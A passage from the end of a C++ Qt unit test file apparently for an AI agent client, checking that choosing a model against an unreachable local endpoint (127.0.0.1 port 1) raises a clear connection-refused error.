  Server client("http://127.0.0.1:1/v1", "key");
  QVERIFY_THROWS_MATCH(client.chooseModel({}), "Could not reach http://127.0.0.1:1/v1: .*\\(ECONNREFUSED\\)\\.\\nNothing is listening");
}

#endif

QTEST_GUILESS_MAIN(TestAgent)
#include "test_agent.moc"
